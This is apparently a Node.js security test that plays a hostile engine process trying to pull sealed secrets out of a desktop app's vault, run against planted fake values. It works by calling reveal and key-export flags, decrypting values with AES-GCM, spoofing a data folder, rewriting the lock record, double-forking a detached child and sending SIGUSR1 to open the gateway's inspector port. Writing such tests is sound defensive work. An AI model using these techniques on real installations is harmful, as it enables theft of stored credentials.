#!/usr/bin/env node
// "A process an engine runs" trying to get stored secrets through the app's own binary (sec-vault,
// 2026-11-15; after the independent reviewer's attack.mjs). It knows what an engine knows: its own
// environment, the app's binary (argv[2], or whatever its environment names), the fixed data folder
// and the sealed values in it. It tries:
//   1. `--reveal-ai-secrets` with every sealed value it found;
//   2. `--office-secret-key` for the data folder, and with a key, opens every sealed value;
//   3. the same from a double-forked, detached grandchild (re-parented away from this process);
//   4. SIGUSR1 to the gateway (its pid is in host.lock/owner.json), then Node's inspector port.
// What it opened goes to attack-result.json beside this script (read by the check, then deleted);
// stdout carries booleans only. Only planted fake words are ever in the folder it is pointed at.
import { spawn, spawnSync } from "node:child_process";
import { createDecipheriv } from "node:crypto";
import { existsSync, readFileSync, writeFileSync } from "node:fs";
import { connect } from "node:net";
import { homedir } from "node:os";
import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";

const here = dirname(fileURLToPath(import.meta.url));
const resultFile = process.env.ATTACK_RESULT ?? join(here, "attack-result.json");
const dataDir = process.env.WORKBENCH_DATA_DIR ?? join(homedir(), ".local/share/achmage-workbench");
const binaries = [...new Set([process.argv[2], process.env.WORKBENCH_SECRET_BIN, process.env.WORKBENCH_APP_BIN, process.env.WORKBENCH_PTY_BIN].filter(Boolean))];
const sealed = JSON.parse(readFileSync(join(dataDir, "sec-planted-sealed.json"), "utf8"));
const PREFIX = "sealed:v1:workbench:";

function tryKey(bin) {
  const run = spawnSync(bin, ["--office-secret-key"], { input: JSON.stringify({ directory: dataDir, create: false }), encoding: "utf8", timeout: 30_000 });
  try { const answer = JSON.parse(run.stdout); return typeof answer.key === "string" ? answer.key : null; } catch { return null; }
}
function open(key, value, purpose, bind) {
  try {
    const [id, ...rest] = value.slice(PREFIX.length).split(":");
    const body = purpose ? rest.slice(1).join(":") : rest.join(":");
    const [nonce, bytes, tag] = body.split(".").map((part) => Buffer.from(part, "base64url"));
    const decipher = createDecipheriv("aes-256-gcm", Buffer.from(key, "base64"), nonce);
    decipher.setAAD(Buffer.from(`${PREFIX}${id}${purpose ? `:${purpose}` : ""}${bind ? `\n${bind}` : ""}`)); decipher.setAuthTag(tag);
    return Buffer.concat([decipher.update(bytes), decipher.final()]).toString("utf8");
  } catch { return null; }
}
const openAll = (key) => key ? [open(key, sealed.office), open(key, sealed.cred, "cred", sealed.credBind), open(key, sealed.channel, "channel")].filter(Boolean) : [];

// Double-forked grandchild: runs this file again in "grandchild" mode, detached, and exits at once.
if (process.argv[3] === "--grandchild") {
  writeFileSync(process.argv[4], JSON.stringify(openAll(binaries.map(tryKey).find(Boolean) ?? null)));
  process.exit(0);
}

const opened = [];
const report = {};
report.helperPathsInEnvironment = ["WORKBENCH_SECRET_BIN", "WORKBENCH_PTY_BIN", "WORKBENCH_TOKEN"].filter((name) => process.env[name]);
for (const bin of binaries) {
  const reveal = spawnSync(bin, ["--reveal-ai-secrets"], { input: JSON.stringify([sealed.office, sealed.cred, sealed.channel]), encoding: "utf8", timeout: 30_000 });
  try { opened.push(...Object.values(JSON.parse(reveal.stdout.trim().split("\n").pop()).secrets ?? {})); } catch { /* nothing came back */ }
  opened.push(...openAll(tryKey(bin)));
}
// 5. The fake folder: the vault-id copied, a lock record naming this process, asked as that folder's own.
const fake = join(here, `fake-profile-${process.pid}`);
spawnSync("mkdir", ["-p", join(fake, "office"), join(fake, "host.lock")]);
try {
  writeFileSync(join(fake, "office/vault-id"), readFileSync(join(dataDir, "office/vault-id")));
  writeFileSync(join(fake, "host.lock/owner.json"), JSON.stringify({ ownerPid: process.pid }));
  for (const bin of binaries) {
    const run = spawnSync(bin, ["--office-secret-key"], { input: JSON.stringify({ directory: fake, create: false }), encoding: "utf8", timeout: 30_000 });
    try { const key = JSON.parse(run.stdout).key; if (typeof key === "string") opened.push(...openAll(key)); } catch { /* nothing came back */ }
  }
  report.fakeFolderTried = true;
} catch { report.fakeFolderTried = false; }
// 6. The real folder's lock record rewritten to name this process.
const lockFile = join(dataDir, "host.lock/owner.json");
try {
  const saved = readFileSync(lockFile, "utf8");
  writeFileSync(lockFile, JSON.stringify({ ...JSON.parse(saved), ownerPid: process.pid }));
  for (const bin of binaries) opened.push(...openAll(tryKey(bin)));
  writeFileSync(lockFile, saved);
  report.recordRewriteTried = true;
} catch { report.recordRewriteTried = false; }
spawnSync("rm", ["-rf", fake]);
const grandchildOut = join(here, `attack-grandchild-${process.pid}.json`);
const middle = spawn(process.execPath, ["-e", `require("node:child_process").spawn(process.execPath, ${JSON.stringify([fileURLToPath(import.meta.url), binaries[0] ?? "", "--grandchild", grandchildOut])}, { detached: true, stdio: "ignore", env: process.env }).unref()`], { stdio: "ignore", env: process.env });
await new Promise((done) => middle.once("exit", done));
for (let i = 0; i < 100 && !existsSync(grandchildOut); i++) await new Promise((done) => setTimeout(done, 100));
try { opened.push(...JSON.parse(readFileSync(grandchildOut, "utf8"))); report.grandchildRan = true; } catch { report.grandchildRan = false; }
spawnSync("rm", ["-f", grandchildOut]);
// 4. Node's inspector in the gateway.
let gatewayPid = null;
try { gatewayPid = JSON.parse(readFileSync(join(dataDir, "host.lock/owner.json"), "utf8")).ownerPid; } catch { /* no gateway */ }
const inspectorPort = () => new Promise((done) => {
  const socket = connect(9229, "127.0.0.1", () => { socket.destroy(); done(true); });
  socket.once("error", () => done(false)); socket.setTimeout(1000, () => { socket.destroy(); done(false); });
});
report.inspectorOpened = false;
if (gatewayPid) {
  if (await inspectorPort()) report.inspectorOpened = "port-busy-before"; // someone else's: no conclusion
  else {
    try { process.kill(gatewayPid, "SIGUSR1"); } catch { /* not allowed */ }
    await new Promise((done) => setTimeout(done, 800));
    report.inspectorOpened = await inspectorPort();
  }
}
report.tried = binaries.length;
writeFileSync(resultFile, JSON.stringify({ ...report, opened }), { mode: 0o600 });
console.log(JSON.stringify({ tried: binaries.length, somethingOpened: opened.length > 0, grandchildRan: report.grandchildRan, fakeFolderTried: report.fakeFolderTried, recordRewriteTried: report.recordRewriteTried, inspectorOpened: report.inspectorOpened, helperPathsInEnvironment: report.helperPathsInEnvironment }));
